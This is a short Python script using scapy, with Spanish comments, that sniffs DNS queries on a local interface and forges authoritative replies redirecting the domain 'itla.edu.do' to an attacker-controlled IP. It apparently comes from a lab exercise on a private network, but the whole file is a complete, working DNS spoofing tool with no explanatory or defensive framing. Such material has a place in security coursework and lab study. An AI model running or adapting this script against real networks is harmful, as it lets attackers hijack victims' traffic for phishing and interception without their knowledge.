#!/usr/bin/env python3
from scapy.all import *

# Configuración basada en tu topología
target_dns = b"itla.edu.do."
fake_ip = "192.168.11.137" # IP del Atacante
iface = "ens33"

def dns_poison(pkt):
    # Verificamos si es una consulta DNS (QR=0)
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
        qname = pkt[DNSQR].qname
        
        if target_dns in qname:
            print(f"[*] Petición detectada para {qname.decode()}. Enviando IP falsa: {fake_ip}")
            
            # Construir la respuesta DNS falsa
            poisoned_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
                           UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
                           DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                               an=DNSRR(rrname=qname, ttl=10, rdata=fake_ip))
            
            send(poisoned_pkt, iface=iface, verbose=False)

if __name__ == "__main__":
    print(f"[*] Escuchando peticiones DNS para {target_dns.decode()} en {iface}...")
    # Filtramos por puerto 53 UDP
    sniff(iface=iface, filter="udp port 53", prn=dns_poison)
